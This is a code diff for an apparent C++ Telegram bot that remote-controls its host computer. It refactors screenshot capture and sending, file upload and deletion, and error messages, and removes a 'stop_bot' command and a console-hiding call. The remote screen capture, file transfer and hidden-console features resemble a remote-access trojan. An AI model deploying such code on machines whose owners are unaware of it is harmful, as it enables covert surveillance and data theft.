@@ -56,6 +56,8 @@ void handleResult(Result result, const TgBot::Bot& bot, int64_t chatId) {
 	case COE::NotARegularFile: message = "The path is not a regular file. "; break;
 
 	case COE::RemoveFileError: message = "Cannot delete the file. "; break;
+
+	case COE::NotAFile:		   message = "Please send a file first. "; break;
 	}
 	bot.getApi().sendMessage(chatId, message + details);
 }
@@ -150,14 +152,10 @@ void startBot(std::string token)
 		{	
 			try {
 				takeScreenshot(scrname);
-				TgBot::InputFile::Ptr document = TgBot::InputFile::fromFile(scrname, "image/bmp");
-
-				bot.getApi().sendDocument(message->chat->id, document);
-
-				if (fs::remove(scrname))
-					bot.getApi().sendMessage(message->chat->id, "Screenshot has been successfully deleted.");
-				else
-					bot.getApi().sendMessage(message->chat->id, "Cannot delete the screenshot.");
+				Result result = sendFile(bot, scrname, message->chat->id);
+				handleResult(result, bot, message->chat->id);
+				result = deleteFile(scrname);
+				handleResult(result, bot, message->chat->id);
 			}
 			catch (const std::exception& e) {
 				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
@@ -272,10 +270,6 @@ void startBot(std::string token)
 		});*/
 
 
-	bot.getEvents().onCommand("stop_bot", [&bot](TgBot::Message::Ptr message) {
-		exit(0);
-		});
-
 	// ALL messages from the user are processed here FIRST.
 	bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
 
@@ -288,7 +282,6 @@ void startBot(std::string token)
 		else if (message->text == "/exit_mode") {
 			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
 			currentMode = Mode::STANDARD;
-			HideConsole();
 			isConversationRunning = false;
 			return;
 		}
@@ -339,16 +332,14 @@ void startBot(std::string token)
 			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::UPLOAD_FILE:
-			uploadFile(bot, message);
+			result = uploadFile(bot, message);
 			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::PLAY_MUSIC:
 			playMusic(bot, message);
-			handleResult(result, bot, message->chat->id);
+			//handleResult(result, bot, message->chat->id);
 			break;
 		}
-		
-
 		});
 
 
